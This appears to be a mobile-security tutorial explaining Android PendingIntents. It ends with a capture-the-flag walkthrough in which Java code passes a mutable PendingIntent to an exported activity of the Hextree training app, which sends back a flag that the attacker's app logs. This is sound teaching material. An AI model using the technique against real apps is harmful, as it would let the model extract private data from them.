---
title: "Pending intents"
---

> **Note**: this section requires a full understanding of [Intent attack surface](intent attack surface.html).

## Introduction

Let's say we have two apps:

* **App A**:
    * This app has a special, private activity called SecondActivity.
    * In its `AndroidManifest.xml`, this activity is marked as `android:exported="false"`. This is very important. It means no other app on the phone is allowed to start this activity directly. It's for internal use only.
* **App B**:
    * This app allows a user to create a home screen widget.
    * The goal is for this widget, when tapped, to open the SecondActivity directly inside the app A.

**The Problem Without PendingIntent**

If App B tried to launch the diary entry screen directly, it would fail.

In App B's code:

```java
// THIS WILL FAIL
Intent intent = new Intent();
// Tries to explicitly name the private component in App A
intent.setComponent(new ComponentName("com.example.secure_diary", "com.example.secure_diary.SecondActivity"));
try {
    context.startActivity(intent);
} catch (SecurityException e) {
    // CRASH! Android system blocks this, saying App B does not
    // have permission to launch a non-exported activity in App A.
}
```

This is the Android security model working perfectly. App B shouldn't be able to force open private parts of App A.

**The Solution With PendingIntent**

**Step 1: App A (Secure Diary) Creates the "Key"**

App A must provide a way for App B to request a key. Let's imagine App A has a BroadcastReceiver that listens for a "key request" from App B. When App B sends this broadcast, App A runs the following code:

```java
// 1. Create the INTENT - The specific instruction.
//    This points to our OWN private activity.
Intent intent = new Intent();
intent.setComponent(new ComponentName(
                getPackageName(),
                SecondActivity.class.getCanonicalName()
        ));
intent.putExtra("entry_template", "Meeting Notes"); // We can even add extras!

// 2. Create the PENDINGINTENT
//    We wrap our private intent inside this special token.
PendingIntent pendingIntent = PendingIntent.getActivity(
    this,
    101, // A unique request code to identify this key
    intent,
    PendingIntent.FLAG_IMMUTABLE // ignore for now
);

// 3. Give the key to App B.
```

App A has now created a secure token. This `pendingIntent` object is a reference managed by the Android system itself. It contains the instruction to launch `SecondActivity`, but it can only be used to do that one thing.

**Step 2: App B (Shortcut Maker) Uses the "Key"**

App B receives this `pendingIntent` object from App A. Now, App B can attach this token to its widget. When the user taps the widget, App B simply tells the system: "Use this key."

```java
// Assume 'theKeyFromAppA' is the PendingIntent object we received.

// We don't say "startActivity", we just say "send the request".
theKeyFromAppA.send();
```

**What happens when .send() is called?**

1. App B calls `.send()` on the PendingIntent token.
2. The Android System intercepts this call.
3. The System inspects the token and sees, "Ah, this token was created by App A."
4. The System unwraps the token and finds the original Intent inside ("Launch SecondActivity").
5. The System now executes that Intent with the identity and permissions of App A.
6. Since App A is perfectly allowed to launch its own non-exported activity, the launch succeeds

# Vulnerabilities

## Share a mutable pending

Let's say that the app `io.hextree.attacksurface` has the following activity:

```xml
<activity
    android:name="io.hextree.attacksurface.activities.Flag22Activity"
    android:exported="true"/>
```

```java
public class Flag22Activity extends AppCompactActivity {
    public Flag22Activity() {...}

    @Override
    protected void onCreate(Bundle bundle) throws PendingIntent.CanceledException {
        super.onCreate(bundle);
        this.f182f = new LogHelper(this);
        PendingIntent pendingIntent = (PendingIntent) getIntent().getParcelableExtra("PENDING");
        if (pendingIntent != null) {
            try {
                Intent intent = new Intent();
                intent.getExtras();
                intent.putExtra("success", true);
                intent.putExtra("flag", this.f182f.appendLog(this.flag));
                pendingIntent.send(this, 0, intent);
                success(null, this);
            } catch (Exception e) {...}
        }
    }
}
```

Basically, it retrieves the `PendingIntent`, construct a new `Intent` and calls `pendingIntent.send()`. The key line happen when the app executes `pendingIntent.send()` because it's triggering the operation that the `PendingIntent` rapresents. Most importantly, the third argument (`Intent`) which is merged with the original intent created when the `PendingIntent` is made.

To obtain this flag, I created two activities:

```xml
<activity
    android:name=".SecondActivity"
    android:exported="false" />
<activity
    android:name=".MainActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN" />
        <category android:name="android.intent.category.LAUNCHER" />
    </intent-filter>
</activity>
```

In the `MainActivity`, we need to a `PendingIntent` that targets my own `SecondActivity`. One of the crucial point is to add the flag `PendingIntent.FLAG_MUTABLE` since the target app needs to be able to modify the `Intent`'s extras.

```java
Intent targetIntent = new Intent();
targetIntent.setComponent(new ComponentName(
        getPackageName(),
        SecondActivity.class.getCanonicalName()
));
PendingIntent pendingIntent = PendingIntent.getActivity(this,0,targetIntent, PendingIntent.FLAG_MUTABLE);

Intent intent = new Intent();
intent.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag22Activity"
));
intent.putExtra("PENDING", pendingIntent);
startActivity(intent);
```

`SecondActivity` code:

```java
Intent intent = getIntent();
String flag = intent.getStringExtra("flag");
Log.d("Flag", String.valueOf(flag));
```

